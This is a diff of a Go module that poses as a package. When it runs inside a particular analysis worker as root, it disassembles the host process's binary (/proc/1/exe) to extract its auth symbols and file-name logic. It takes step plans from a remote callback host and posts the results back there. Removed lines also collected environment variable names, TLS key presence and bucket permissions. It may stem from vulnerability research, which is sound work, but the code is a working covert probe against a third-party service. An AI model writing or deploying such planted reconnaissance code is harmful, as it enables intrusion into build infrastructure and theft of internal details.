@@ -40,7 +40,8 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.49-codex"
+	probeVersion           = "v0.0.60-codex"
+	expectedUserAgent      = "go-cgo-pkgsite-probe-v060-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -84,29 +85,9 @@ type commandResult struct {
 	StderrTruncated bool   `json:"stderr_truncated"`
 }
 
-type fileEntry struct {
-	Name string `json:"name"`
-	Mode string `json:"mode"`
-	Size int64  `json:"size"`
-}
-
-type tlsFile struct {
-	Path    string `json:"path"`
-	Present bool   `json:"present"`
-	Mode    string `json:"mode,omitempty"`
-	Size    int64  `json:"size,omitempty"`
-}
-
 type identityResult struct {
-	Lane             string      `json:"lane"`
-	CWD              string      `json:"cwd"`
-	UID              int         `json:"uid"`
-	GID              int         `json:"gid"`
-	Hostname         string      `json:"hostname"`
-	PID1             string      `json:"pid1"`
-	ModuleFiles      []fileEntry `json:"module_files"`
-	EnvironmentNames []string    `json:"environment_names"`
-	TLSFiles         []tlsFile   `json:"tls_files"`
+	Lane string `json:"lane"`
+	CWD  string `json:"-"`
 }
 
 type metadataResult struct {
@@ -145,15 +126,41 @@ type planStep struct {
 }
 
 type inspectionResult struct {
-	Descriptors  []json.RawMessage   `json:"descriptors,omitempty"`
-	Symbols      []string            `json:"symbols,omitempty"`
-	DialWindow   []string            `json:"dial_window,omitempty"`
-	CallerWindow []string            `json:"caller_window,omitempty"`
-	MetadataKey  string              `json:"metadata_key,omitempty"`
-	KeyAddress   string              `json:"metadata_key_address,omitempty"`
-	KeyLength    int                 `json:"metadata_key_length,omitempty"`
-	AuthFileName *authFileNameResult `json:"auth_file_name,omitempty"`
-	Error        string              `json:"error,omitempty"`
+	Descriptors     []json.RawMessage       `json:"descriptors,omitempty"`
+	Symbols         []string                `json:"symbols,omitempty"`
+	DialWindow      []string                `json:"dial_window,omitempty"`
+	CallerWindow    []string                `json:"caller_window,omitempty"`
+	MetadataKey     string                  `json:"metadata_key,omitempty"`
+	KeyAddress      string                  `json:"metadata_key_address,omitempty"`
+	KeyLength       int                     `json:"metadata_key_length,omitempty"`
+	AuthFileName    *authFileNameResult     `json:"auth_file_name,omitempty"`
+	FileNameAddress string                  `json:"auth_filename_address,omitempty"`
+	InitSymbols     []staticSymbol          `json:"auth_init_symbols,omitempty"`
+	InitWindows     []initDisassemblyWindow `json:"auth_init_windows,omitempty"`
+	LoadFileEntry   *functionDisassembly    `json:"load_file_entry,omitempty"`
+	AuthSourceNames []string                `json:"auth_source_names,omitempty"`
+	AuthFileOpened  bool                    `json:"auth_file_opened"`
+	Error           string                  `json:"error,omitempty"`
+}
+
+type functionDisassembly struct {
+	Symbol            staticSymbol `json:"symbol"`
+	DisassemblySHA256 string       `json:"disassembly_sha256"`
+	LineCount         int          `json:"line_count"`
+	Lines             []string     `json:"lines"`
+	CallSymbols       []string     `json:"call_symbols,omitempty"`
+	LinesDropped      bool         `json:"lines_dropped"`
+}
+
+type initDisassemblyWindow struct {
+	Symbol     string   `json:"symbol"`
+	Occurrence int      `json:"occurrence"`
+	Lines      []string `json:"lines"`
+}
+
+type staticSymbol struct {
+	Name    string `json:"name"`
+	Address string `json:"address"`
 }
 
 type pathStatResult struct {
@@ -174,24 +181,28 @@ type authFileNameResult struct {
 }
 
 type probeReport struct {
-	Schema            string            `json:"schema"`
-	Module            string            `json:"module"`
-	Version           string            `json:"version"`
-	TargetModule      string            `json:"target_module,omitempty"`
-	TargetVersion     string            `json:"target_version,omitempty"`
-	StartedUTC        string            `json:"started_utc"`
-	FinishedUTC       string            `json:"finished_utc"`
-	Identity          identityResult    `json:"identity"`
-	Metadata          metadataResult    `json:"metadata"`
-	BucketPermissions []bucketResult    `json:"bucket_permissions,omitempty"`
-	CanaryURLSHA256   string            `json:"canary_url_sha256,omitempty"`
-	CanaryBodySHA256  string            `json:"canary_body_sha256,omitempty"`
-	Byteman           []grpcResult      `json:"byteman,omitempty"`
-	DownloadAttempted bool              `json:"download_attempted"`
-	PlanID            string            `json:"plan_id,omitempty"`
-	RouteMode         string            `json:"route_mode,omitempty"`
-	Inspection        *inspectionResult `json:"inspection,omitempty"`
-	Reason            string            `json:"reason,omitempty"`
+	Schema                              string            `json:"schema"`
+	Module                              string            `json:"module"`
+	Version                             string            `json:"version"`
+	TargetModule                        string            `json:"-"`
+	TargetVersion                       string            `json:"-"`
+	StartedUTC                          string            `json:"started_utc"`
+	FinishedUTC                         string            `json:"finished_utc"`
+	Identity                            identityResult    `json:"identity"`
+	Metadata                            metadataResult    `json:"-"`
+	BucketPermissions                   []bucketResult    `json:"-"`
+	CanaryURLSHA256                     string            `json:"-"`
+	CanaryBodySHA256                    string            `json:"-"`
+	Byteman                             []grpcResult      `json:"-"`
+	DownloadAttempted                   bool              `json:"-"`
+	PlanID                              string            `json:"-"`
+	RouteMode                           string            `json:"-"`
+	Inspection                          *inspectionResult `json:"inspection,omitempty"`
+	Reason                              string            `json:"reason,omitempty"`
+	ProcessMemoryRead                   bool              `json:"process_memory_read"`
+	AuthFileContentRead                 bool              `json:"auth_file_content_read"`
+	MutatingRequestsAttempted           bool              `json:"mutating_requests_attempted"`
+	NonCallbackNetworkRequestsAttempted bool              `json:"non_callback_network_requests_attempted"`
 }
 
 type tokenResponse struct {
@@ -201,33 +212,71 @@ type tokenResponse struct {
 }
 
 func main() {
-	if genericResultURL == "" || compilerResultURL == "" || planURL == "" || bytemanCanaryURL == "" ||
-		sessionNonce == "" || probeUserAgent == "" || genericResultURL == compilerResultURL ||
+	if validateCallbackConfiguration() != nil ||
 		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
 		return
 	}
 	started := time.Now()
 	cwd := initialWorkingDirectory()
 	identity := inspectIdentity(cwd)
-	if identity.Lane == "capslock" {
-		runCapslockSession(started, cwd, identity)
-		return
-	}
 	report := newProbeReport(started, identity)
-	report.Reason = "internal checks are fixed to the verified capslock lane"
+	endpoint := genericResultURL
+	resultID := "v060-codex-" + identity.Lane
+	if identity.Lane == "capslock" {
+		endpoint = compilerResultURL
+		resultID = "v060-codex-capslock-auth-static"
+		runAuthStaticInspection(&report)
+	} else {
+		report.Reason = "static auth inspection is fixed to the verified capslock lane"
+	}
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v049-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
+}
+
+func validSessionNonce(value string) bool {
+	if len(value) != 64 {
+		return false
+	}
+	for _, character := range value {
+		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
+			return false
+		}
+	}
+	return true
+}
+
+func exactCallbackURL(raw, expectedPath string) (*url.URL, error) {
+	parsed, err := url.Parse(raw)
+	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
+		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
+		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
+		return nil, errors.New("callback URL was outside its exact fixed HTTPS shape")
+	}
+	return parsed, nil
+}
+
+func validateCallbackConfiguration() error {
+	if !validSessionNonce(sessionNonce) || probeUserAgent != expectedUserAgent {
+		return errors.New("callback identity was invalid")
+	}
+	generic, err := exactCallbackURL(genericResultURL, "/v1/result/"+sessionNonce+"/generic")
+	if err != nil {
+		return err
+	}
+	compiler, err := exactCallbackURL(compilerResultURL, "/v1/result/"+sessionNonce+"/compiler")
+	if err != nil || generic.Scheme != compiler.Scheme || generic.Host != compiler.Host {
+		return errors.New("callback endpoints did not share one exact HTTPS origin")
+	}
+	return nil
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
 	return probeReport{
-		Schema:        "owned-byteman-probe/v1",
-		Module:        moduleName,
-		Version:       probeVersion,
-		TargetModule:  targetModuleName,
-		TargetVersion: targetVersion,
-		StartedUTC:    started.UTC().Format(time.RFC3339Nano),
-		Identity:      identity,
+		Schema:     "auth-static-inspection/v1",
+		Module:     moduleName,
+		Version:    probeVersion,
+		StartedUTC: started.UTC().Format(time.RFC3339Nano),
+		Identity:   identity,
 	}
 }
 
@@ -264,61 +313,22 @@ func initialWorkingDirectory() string {
 }
 
 func inspectIdentity(cwd string) identityResult {
-	lane := "other"
+	return identityResult{
+		Lane: classifyLaneWithIdentity(cwd, os.Geteuid(), readSmallFile("/proc/1/cmdline", 8192)),
+		CWD:  cwd,
+	}
+}
+
+func classifyLaneWithIdentity(cwd string, effectiveUID int, pid1 string) string {
 	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
-	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
-		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
-			lane = "capslock"
-		}
-	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
-		lane = "generic"
+	if effectiveUID == 0 && strings.Contains(pid1, "talisman-worker-capabilities") &&
+		(cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
+		return "capslock"
 	}
-	hostname, _ := os.Hostname()
-	result := identityResult{
-		Lane:     lane,
-		CWD:      cwd,
-		UID:      os.Geteuid(),
-		GID:      os.Getegid(),
-		Hostname: hostname,
-		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
+	if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
+		return "generic"
 	}
-	if len(result.PID1) > 1024 {
-		result.PID1 = result.PID1[:1024] + "[truncated]"
-	}
-	entries, _ := os.ReadDir(cwd)
-	for _, entry := range entries {
-		if len(result.ModuleFiles) >= 128 {
-			break
-		}
-		info, err := entry.Info()
-		if err != nil {
-			continue
-		}
-		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
-			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
-		})
-	}
-	for _, value := range os.Environ() {
-		name, _, found := strings.Cut(value, "=")
-		if found && name != "" {
-			result.EnvironmentNames = append(result.EnvironmentNames, name)
-		}
-	}
-	sort.Strings(result.EnvironmentNames)
-	for _, path := range []string{
-		"/etc/tls/server-pool/server-tls-pool.pem",
-		"/etc/tls/client/tls.crt",
-		"/etc/tls/client/tls.key",
-	} {
-		item := tlsFile{Path: path}
-		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
-			item.Present = true
-			item.Mode = info.Mode().String()
-			item.Size = info.Size()
-		}
-		result.TLSFiles = append(result.TLSFiles, item)
-	}
-	return result
+	return "other"
 }
 
 func readSmallFile(path string, maximum int64) string {
@@ -340,13 +350,6 @@ func cleanError(err error) string {
 	}
 	value := err.Error()
 	value = strings.ReplaceAll(value, sessionNonce, "[session]")
-	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
-	if rpcDialAddress != "" {
-		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
-	}
-	if rpcServiceHost != "" {
-		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
-	}
 	if len(value) > 1024 {
 		value = value[:1024] + "[truncated]"
 	}
@@ -355,9 +358,9 @@ func cleanError(err error) string {
 
 func runCapslockSession(started time.Time, cwd string, identity identityResult) {
 	initial := newProbeReport(started, identity)
-	initial.Reason = "waiting for the bounded read-only auth filename plan"
+	initial.Reason = "waiting for the bounded read-only auth init plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v049-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v051-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -386,13 +389,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		switch step.Action {
 		case "finish":
 			report.Reason = "bounded plan finished"
-		case "inspect-auth-filename":
-			runAuthFileNameInspection(&report)
+		case "inspect-auth-init":
+			runAuthInitInspection(&report)
 		default:
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v049-codex-step-" + strconv.Itoa(cursor)
+		id := "v051-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -411,7 +414,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v049-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v051-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -467,7 +470,7 @@ func validatePlanStep(step planStep) error {
 		}
 	}
 	switch step.Action {
-	case "inspect-auth-filename", "finish":
+	case "inspect-auth-init", "finish":
 		if step.RouteMode != "" {
 			return errors.New("non-probe plan included route parameters")
 		}
@@ -618,8 +621,8 @@ func scanBoundedLines(data []byte, include func(string) bool, maximum int) []str
 	scanner.Buffer(make([]byte, 4096), 64*1024)
 	for scanner.Scan() && len(result) < maximum {
 		line := strings.TrimSpace(scanner.Text())
-		if len(line) > 512 {
-			line = line[:512] + "[truncated]"
+		if len(line) > 256 {
+			line = line[:256] + "[truncated]"
 		}
 		if line != "" && include(line) {
 			result = append(result, line)
@@ -645,6 +648,322 @@ func instructionWindow(data []byte, marker string, before, after int) []string {
 		return append([]string(nil), lines[start:end]...)
 	}
 	return nil
+}
+
+func boundedInstructionWindows(data []byte, marker string, before, after, maximum int) [][]string {
+	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
+	type interval struct{ start, end int }
+	intervals := make([]interval, 0, maximum)
+	for index, line := range lines {
+		if !strings.Contains(line, marker) {
+			continue
+		}
+		start := index - before
+		if start < 0 {
+			start = 0
+		}
+		end := index + after + 1
+		if end > len(lines) {
+			end = len(lines)
+		}
+		if len(intervals) > 0 && start <= intervals[len(intervals)-1].end {
+			if end > intervals[len(intervals)-1].end {
+				intervals[len(intervals)-1].end = end
+			}
+			continue
+		}
+		if len(intervals) >= maximum {
+			break
+		}
+		intervals = append(intervals, interval{start: start, end: end})
+	}
+	result := make([][]string, 0, len(intervals))
+	for _, item := range intervals {
+		result = append(result, append([]string(nil), lines[item.start:item.end]...))
+	}
+	return result
+}
+
+const authInitSymbolPrefix = "sos.googlesource.com/sos/auth.init"
+const authLoadFileEntrySymbol = "sos.googlesource.com/sos/auth.LoadFileEntry"
+const maximumFunctionDisassemblyLines = 256
+
+var callTargetPattern = regexp.MustCompile(`<([^<>]{1,256})>`)
+
+func exactFunctionSymbol(nmOutput []byte, name string) (staticSymbol, error) {
+	var result staticSymbol
+	found := false
+	scanner := bufio.NewScanner(bytes.NewReader(nmOutput))
+	scanner.Buffer(make([]byte, 4096), 64*1024)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) != 3 || fields[2] != name || len(fields[1]) != 1 {
+			continue
+		}
+		if fields[1] != "T" && fields[1] != "t" {
+			return staticSymbol{}, errors.New("requested function was not an executable-text symbol")
+		}
+		address, err := strconv.ParseUint(fields[0], 16, 64)
+		if err != nil || address == 0 || found {
+			return staticSymbol{}, errors.New("requested function symbol was invalid or duplicated")
+		}
+		result = staticSymbol{Name: name, Address: fmt.Sprintf("0x%x", address)}
+		found = true
+	}
+	if err := scanner.Err(); err != nil {
+		return staticSymbol{}, errors.New("worker function symbol scan failed")
+	}
+	if !found {
+		return staticSymbol{}, errors.New("worker requested function symbol was missing")
+	}
+	return result, nil
+}
+
+func disassemblyCallSymbols(lines []string) []string {
+	result := make([]string, 0, 32)
+	seen := make(map[string]struct{})
+	for _, line := range lines {
+		if !strings.Contains(line, "call") {
+			continue
+		}
+		match := callTargetPattern.FindStringSubmatch(line)
+		if len(match) != 2 || match[1] == "" {
+			continue
+		}
+		if _, duplicate := seen[match[1]]; duplicate {
+			continue
+		}
+		if len(result) >= 128 {
+			break
+		}
+		seen[match[1]] = struct{}{}
+		result = append(result, match[1])
+	}
+	return result
+}
+
+func boundedFunctionDisassembly(symbol staticSymbol, data []byte) functionDisassembly {
+	digest := sha256.Sum256(data)
+	lines := scanBoundedLines(data, func(string) bool { return true }, maximumFunctionDisassemblyLines+1)
+	dropped := len(lines) > maximumFunctionDisassemblyLines
+	if dropped {
+		lines = lines[:maximumFunctionDisassemblyLines]
+	}
+	return functionDisassembly{
+		Symbol: symbol, DisassemblySHA256: hex.EncodeToString(digest[:]), LineCount: len(lines),
+		Lines: lines, CallSymbols: disassemblyCallSymbols(lines), LinesDropped: dropped,
+	}
+}
+
+func authSourceName(line string) (string, bool) {
+	for _, canonical := range [...]string{
+		authFileNameSymbol,
+		authLoadFileEntrySymbol,
+		authInitSymbolPrefix,
+	} {
+		if strings.Contains(line, canonical) {
+			return canonical, true
+		}
+	}
+	return "", false
+}
+
+func runFixedAuthSourceNames() ([]string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
+	defer cancel()
+	command := exec.CommandContext(ctx, "/usr/bin/strings", "-a", "-n", "4", "/proc/1/exe")
+	stdout, err := command.StdoutPipe()
+	if err != nil {
+		return nil, errors.New("fixed strings inspection could not start")
+	}
+	if err := command.Start(); err != nil {
+		return nil, errors.New("fixed strings inspection failed")
+	}
+	result := make([]string, 0, 32)
+	seen := make(map[string]struct{})
+	scanner := bufio.NewScanner(stdout)
+	scanner.Buffer(make([]byte, 4096), 1024*1024)
+	for scanner.Scan() {
+		name, matched := authSourceName(scanner.Text())
+		if !matched {
+			continue
+		}
+		if _, duplicate := seen[name]; duplicate {
+			continue
+		}
+		if len(result) >= 64 {
+			continue
+		}
+		seen[name] = struct{}{}
+		result = append(result, name)
+	}
+	scanErr := scanner.Err()
+	waitErr := command.Wait()
+	if ctx.Err() != nil {
+		return nil, errors.New("fixed strings inspection timed out")
+	}
+	if scanErr != nil || waitErr != nil {
+		return nil, errors.New("fixed strings inspection failed")
+	}
+	return result, nil
+}
+
+func isBoundedAuthInitSymbol(name string) bool {
+	if name == authInitSymbolPrefix {
+		return true
+	}
+	if !strings.HasPrefix(name, authInitSymbolPrefix+".") || len(name) <= len(authInitSymbolPrefix)+1 || len(name) > 256 {
+		return false
+	}
+	for _, character := range name[len(authInitSymbolPrefix)+1:] {
+		if (character < 'a' || character > 'z') && (character < 'A' || character > 'Z') &&
+			(character < '0' || character > '9') && character != '.' && character != '_' {
+			return false
+		}
+	}
+	return true
+}
+
+func exactAuthInitSymbols(nmOutput []byte) ([]staticSymbol, error) {
+	result := make([]staticSymbol, 0, 8)
+	seen := make(map[string]struct{})
+	scanner := bufio.NewScanner(bytes.NewReader(nmOutput))
+	scanner.Buffer(make([]byte, 4096), 64*1024)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) != 3 || len(fields[1]) != 1 || !isBoundedAuthInitSymbol(fields[2]) {
+			continue
+		}
+		if fields[1] != "T" && fields[1] != "t" {
+			return nil, errors.New("auth init symbol was not executable text")
+		}
+		address, err := strconv.ParseUint(fields[0], 16, 64)
+		if err != nil || address == 0 {
+			return nil, errors.New("auth init symbol address was invalid")
+		}
+		if _, duplicate := seen[fields[2]]; duplicate {
+			return nil, errors.New("duplicate auth init symbol was found")
+		}
+		if len(result) >= 8 {
+			return nil, errors.New("auth init symbol count exceeded its bound")
+		}
+		seen[fields[2]] = struct{}{}
+		result = append(result, staticSymbol{Name: fields[2], Address: fmt.Sprintf("0x%x", address)})
+	}
+	if err := scanner.Err(); err != nil {
+		return nil, errors.New("auth init symbol scan failed")
+	}
+	if len(result) == 0 {
+		return nil, errors.New("no auth init symbols were found")
+	}
+	return result, nil
+}
+
+func runAuthInitInspection(report *probeReport) {
+	result := &inspectionResult{}
+	report.Inspection = result
+	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
+	fileNameAddress, err := exactSymbolAddress(nmOutput, authFileNameSymbol)
+	if err != nil {
+		result.Error = err.Error()
+		return
+	}
+	result.FileNameAddress = fmt.Sprintf("0x%x", fileNameAddress)
+	result.InitSymbols, err = exactAuthInitSymbols(nmOutput)
+	if err != nil {
+		result.Error = err.Error()
+		return
+	}
+	for _, symbol := range result.InitSymbols {
+		disassembly, err := runFixedTool(
+			"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble="+symbol.Name, "/proc/1/exe",
+		)
+		if err != nil {
+			result.Error = cleanError(err)
+			return
+		}
+		windows := boundedInstructionWindows(disassembly, authFileNameSymbol, 96, 24, 1-len(result.InitWindows))
+		for index, lines := range windows {
+			result.InitWindows = append(result.InitWindows, initDisassemblyWindow{
+				Symbol: symbol.Name, Occurrence: index + 1, Lines: lines,
+			})
+		}
+		if len(result.InitWindows) >= 1 {
+			break
+		}
+	}
+	if len(result.InitWindows) == 0 {
+		result.Error = "auth init disassembly contained no FileName reference"
+		return
+	}
+	report.Reason = "bounded static auth init FileName dataflow inspection completed"
+}
+
+func runAuthStaticInspection(report *probeReport) {
+	result := &inspectionResult{}
+	report.Inspection = result
+	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
+	fileNameAddress, err := exactSymbolAddress(nmOutput, authFileNameSymbol)
+	if err != nil {
+		result.Error = err.Error()
+		return
+	}
+	result.FileNameAddress = fmt.Sprintf("0x%x", fileNameAddress)
+	loadSymbol, err := exactFunctionSymbol(nmOutput, authLoadFileEntrySymbol)
+	if err != nil {
+		result.Error = err.Error()
+		return
+	}
+	loadDisassembly, err := runFixedTool(
+		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble="+loadSymbol.Name, "/proc/1/exe",
+	)
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
+	loadEvidence := boundedFunctionDisassembly(loadSymbol, loadDisassembly)
+	result.LoadFileEntry = &loadEvidence
+	result.InitSymbols, err = exactAuthInitSymbols(nmOutput)
+	if err != nil {
+		result.Error = err.Error()
+		return
+	}
+	for _, symbol := range result.InitSymbols {
+		disassembly, err := runFixedTool(
+			"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble="+symbol.Name, "/proc/1/exe",
+		)
+		if err != nil {
+			result.Error = cleanError(err)
+			return
+		}
+		windows := boundedInstructionWindows(disassembly, authFileNameSymbol, 96, 24, 1-len(result.InitWindows))
+		for index, lines := range windows {
+			result.InitWindows = append(result.InitWindows, initDisassemblyWindow{
+				Symbol: symbol.Name, Occurrence: index + 1, Lines: lines,
+			})
+		}
+		if len(result.InitWindows) >= 1 {
+			break
+		}
+	}
+	if len(result.InitWindows) == 0 {
+		result.Error = "auth init disassembly contained no FileName assignment reference"
+		return
+	}
+	result.AuthSourceNames, err = runFixedAuthSourceNames()
+	if err != nil {
+		result.Error = err.Error()
+		return
+	}
+	report.Reason = "bounded static LoadFileEntry and auth init FileName evidence completed"
 }
 
 const authFileNameSymbol = "sos.googlesource.com/sos/auth.FileName"
@@ -802,9 +1121,8 @@ func runAuthFileNameInspection(report *probeReport) {
 	report.Reason = "bounded linked auth filename and path metadata inspection completed"
 }
 
-var objectAddressPattern = regexp.MustCompile(`#\s*([0-9a-fA-F]+)\s*<`)
-
 func fixedMetadataKeyLocation(data []byte) (uint64, int, error) {
+	objectAddressPattern := regexp.MustCompile(`#\s*([0-9a-fA-F]+)\s*<`)
 	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
 	metadataIndex := -1
 	for index, line := range lines {
@@ -945,7 +1263,7 @@ func runBytemanDescriptorInspection(report *probeReport) {
 		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
 		return
 	}
-	helperCopy := "/tmp/.go-cgo-v049-describe-protos"
+	helperCopy := "/tmp/.go-cgo-v051-describe-protos"
 	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
 	if err != nil {
 		report.Inspection.Error = "fixed descriptor helper copy could not be created"
